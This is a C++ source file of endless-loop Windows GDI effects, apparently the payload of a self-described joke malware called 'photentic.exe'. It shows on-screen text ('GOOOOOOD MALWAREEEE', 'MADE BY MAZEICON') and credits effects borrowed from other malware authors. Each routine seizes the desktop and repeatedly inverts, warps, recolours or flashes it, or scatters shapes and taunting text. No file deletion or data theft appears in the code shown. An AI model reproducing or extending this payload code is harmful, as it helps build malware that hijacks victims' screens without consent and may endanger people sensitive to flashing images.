DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen = { 0 };
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;


	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0;; i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		PRGBQUAD prgbTemp = { 0 };
		prgbTemp = prgbScreen;
		for (int i = 0; i < h; i++) {
			for (int j = 0; j < w; j++) {
				prgbScreen[i * w + j].rgb = prgbTemp[(unsigned int)((float)(j * w + i) + (float)sqrt((unsigned int)(2 * h * j - j * j))) % (w * h)].rgb;
			}
		}
		Sleep(100);
		BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCINVERT);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}
}
DWORD WINAPI pie1(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 200 + x;
		int bottom_y = 200 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		if (x != 0 && y != 0) Pie(hdc, top_x, top_y, bottom_x, bottom_y, rand() % x, rand() % y, rand() % x, rand() % y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader2(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				FLOAT fx = ((x + (i * 4)) ^ (x + y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI stretchblt1(LPVOID lpParam) {
	HDC desk;
	int sw, sh;

	while (1) {
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(desk, -60, -60, sw + 30, sh + 30, desk, 0, 0, sw, sh, 0x999999);
		ReleaseDC(0, desk);
		Sleep(4);
	}
}
DWORD WINAPI pie2(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {//by WinMalware, but I modified it
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	BITMAPINFO bmi = { 0 };
	HBITMAP hbmTemp;
	RGBQUAD* rgbScreen = NULL;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biWidth = screenWidth;
	bmi.bmiHeader.biHeight = screenHeight;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);

	int i = 0;
	while (1) {
		// Capture the screen into the memory DC
		BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (x + i) * y;

				// Generate RGB colors based on the XOR pattern
				rgbScreen[index].rgbRed = (fx & 0xFF) ^ ((fx >> 20) & 0xFF);
				rgbScreen[index].rgbGreen = ((fx >> 5) & 0xFF) ^ (fx & 0xFF);
				rgbScreen[index].rgbBlue = ((fx >> 8) & 0xFF) ^ ((fx >> 10) & 0xFF);
			}
		}

		// Display the updated bitmap on the screen
		StretchBlt(hdcScreen, 0, 0, screenWidth, screenHeight, hdcMem, 0, 0, screenWidth, screenHeight, NOTSRCERASE);

		// Increment the position to create the scrolling effect
		i += 5; // Adjust the speed of the scrolling by changing this value

		Sleep(1); // Adjust the refresh rate by changing this value
	}

	ReleaseDC(NULL, hdcScreen);
	DeleteDC(hdcMem);
	DeleteObject(hbmTemp);

	return 0x00;
}
DWORD WINAPI shader4(LPVOID lpParam) {//by WinMalware, but I modified it
	HDC hdcScreen = GetDC(0);
	HDC hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	bmi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbScreen = nullptr;
	HBITMAP hbmTemp = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);

	INT verticalOffset = 0; // Initial vertical offset

	for (;;) {
		// Capture the screen to hdcMem
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

		// Modify the pixels in the DIB section with downward motion
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w;
			INT y = (i / w + verticalOffset) % h;  // Apply the vertical offset, wrapping around

			// Rainbow effect
			float hue = (x * y) * 0.01f; // Adjust 0.01 factor for speed of color change
			rgbScreen[i].rgbRed = (BYTE)(tan(hue) * 127 + 128);    // Cycle red
			rgbScreen[i].rgbGreen = (BYTE)(tan(hue + 2) * 127 + 128); // Offset for green
			rgbScreen[i].rgbBlue = (BYTE)(tan(hue + 4) * 127 + 128);  // Offset for blue
		}

		// Display the modified image
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);

		// Increase the vertical offset to move down over time
		verticalOffset = (verticalOffset + 1) % h;

		// Small delay to prevent excessive CPU usage
		Sleep(2);
	}

	// Cleanup (this code will never be reached due to the infinite loop)
	DeleteObject(hbmTemp);
	DeleteDC(hdcMem);
	ReleaseDC(0, hdcScreen);

	return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {
	srand(time(NULL));
	int xxx = 0; BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
	while (true) {
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w; i++) {
			StretchBlt(hcdc, i, -2 + (rand() % 5), 1, h, hcdc, i, 0, 1, h, SRCCOPY);
		}
		for (int i = 0; i < h; i++) {
			StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
		}
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x + y * w;
				double wave = tan((x + xxx) * 0.04) + cos((y + xxx) * 0.04);
				pBits[index].rgbRed += (480 * tan(wave) * 0.6);
				pBits[index].rgbGreen += (480 * cos(wave) * 0.6);
				pBits[index].rgbBlue += (480 * tan(wave) * 0.6);
			}
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		Sleep(1); xxx += 4;
	}
}
DWORD WINAPI textout(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	LPCSTR text7 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text1 = "photentic.exe";
		text2 = "GOOOOOOD MALWAREEEE";
		text3 = "MADE BY MAZEICON";
		text4 = "NO SKID KICKED SKIDDER";
		text5 = "SKIDDER aren't 13 Years old";
		text6 = "SKIDDER ARE 9 years old";
		//text7 = "?ж╠?? ?nc? зк??b?o3?5?";
		SetTextColor(hdc, RndRGB);
		HFONT font = CreateFontA(43, 32, rand() % 3600, rand() % 3600, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Impact");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		int rndrgb = RGB(1 + rand() % 256, 1 + rand() % 256, 1 + rand() % 256);;
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x < w; x += 35) {
			for (int y = 0; y < h; y += 35) {
				if (rand() % 8 != 1) {
					StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 20, 20, SRCPAINT);
				}
				else {
					StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 20, 20, SRCINVERT);
				};
			}
		}
		for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= rndrgb; }
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI pathell(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hcdc, hBrush);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		PatBlt(hcdc, 0, 0, w, h, PATINVERT);
		StretchBlt(hcdc, -6, -6, w + 12, h + 12, hcdc, 0, 0, w, h, !(rand() % 2) ? SRCERASE : SRCPAINT);
		BitBlt(hcdc, rand() % 20, rand() % 20, w, h, hcdc, rand() % 20, rand() % 20, SRCCOPY);
		for (int x = 0; x < w; x += 20) {
			StretchBlt(hcdc, x, -5 + rand() % 10, 20, h, hcdc, x, 0, 20, h, !(rand() % 2) ? SRCAND : SRCINVERT);
		}
		for (int y = 0; y < h; y += 20) {
			StretchBlt(hcdc, -5 + rand() % 10, y, w, 20, hcdc, 0, y, w, 20, !(rand() % 2) ? SRCINVERT : SRCPAINT);
		}
		for (int i = 0; i < h; i++) {
			StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCINVERT);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap); DeleteObject(hBrush);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI blur1(LPVOID lpParam) {
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 };
	int size = 450;
	while (true) {
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			INT x = (i * i) % w, y = (i & i) ^ w;
			rgbScreen[i].rgb += (x * y) | (i + w + h) * i;
		}
		for (int i = 0; i < 10; i++) {
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCINVERT);
		}
		for (int i = 0; i < 10; i++) {
			int x = -size + rand() % (w + size), y = -size + rand() % (h + size);
			BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, !(rand() % 2) ? SRCPAINT : NOTSRCCOPY);
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI blur2(LPVOID lpParam) {
	int i = 0, xxx = 0;
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int rndsize = 1 + rand() % 40;
		BITMAPINFO bmi = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		RGBQUAD* pBits = nullptr;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int xxx = 0; xxx < w; xxx += rndsize) {
			StretchBlt(hcdc, xxx, -5 + (rand() % 11), rndsize, h, hcdc, xxx, 0, rndsize, h, SRCINVERT);
		}
		for (int xxx = 0; xxx < h; xxx += rndsize) {
			StretchBlt(hcdc, -5 + (rand() % 11), xxx, w, rndsize, hcdc, 0, xxx, w, rndsize, SRCPAINT);
		}
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y + x * h; float aaa = (i % w) + (i / w);
				pBits[index].rgbRed += (sin(aaa) * 255 + 256);
				pBits[index].rgbGreen += (cos(aaa + 2) * 255 + 256);
				pBits[index].rgbBlue += (tan(aaa + 4) * 255 + 256);
			}
		}
		for (int kun = 0; kun < 2; kun++) {
			int x = rand() % w, y = rand() % h;
			HRGN hrgn = CreateEllipticRgn(x, y, x + 250, y + 250);
			SelectClipRgn(hcdc, hrgn);
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
			SelectObject(hcdc, hBrush);
			BitBlt(hcdc, x, y, w, h, hcdc, x, y, PATINVERT);
			DeleteObject(hrgn); DeleteObject(hBrush);
		}
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		i++;
	}
	return 0;
}
DWORD WINAPI moveing(LPVOID lpvd)//by pankoza
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)5 * i;

				rgbquad[index].rgbRed *= fx;
				rgbquad[index].rgbGreen *= fx;
				rgbquad[index].rgbBlue *= fx;
			}
		}

		i++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 10, SRCINVERT);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, -h + 10, SRCPAINT);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI screenwind(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	for (int t = 0; ; t++) {
		hdc = GetDC(NULL);

		PLOGFONT plf = (PLOGFONT)LocalAlloc(LPTR, sizeof(LOGFONT));
		plf->lfWidth = 50 + (Xorshift32() % 10);
		plf->lfHeight = 50 + (Xorshift32() % 10);
		plf->lfWeight = FW_NORMAL;
		plf->lfEscapement = 10 * (Xorshift32() % 360);
		SelectObject(hcdc, CreateFontIndirect(plf));
		SetBkMode(hcdc, TRANSPARENT);
		//SetTextColor(hcdc, Xorshift32() % 0xffffff);
		//TextOut(hcdc, Xorshift32() % w, Xorshift32() % h, _T("KILL PC"), 7);
		LocalFree((LOCALHANDLE)plf);

		BLENDFUNCTION blf = { 0 };
		blf.BlendOp = AC_SRC_OVER;
		blf.BlendFlags = 0;
		blf.SourceConstantAlpha = 200;
		blf.AlphaFormat = 0;
		AlphaBlend(hdc, sin(t * (PI / 150)) * 55, cos(t * (PI / 150)) * 55, w, h, hcdc, 0, 0, w, h, blf);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);

		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(1);
	}
	ReleaseDC(NULL, hcdc);
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
	return 0;
}
DWORD WINAPI shader7(LPVOID lpvd) //from pankoza's webm.exe, but i modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i * 4) + (i ^ 4) * sqrt(y & y | i * 4));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCERASE);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader8(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x << y) * sqrt(log(i)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 450.f + y / screenHeight * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCINVERT);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader9(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (x * y) * RGB(GetRValue(RndRGB), GetGValue(RndRGB), GetBValue(RndRGB));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCERASE);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}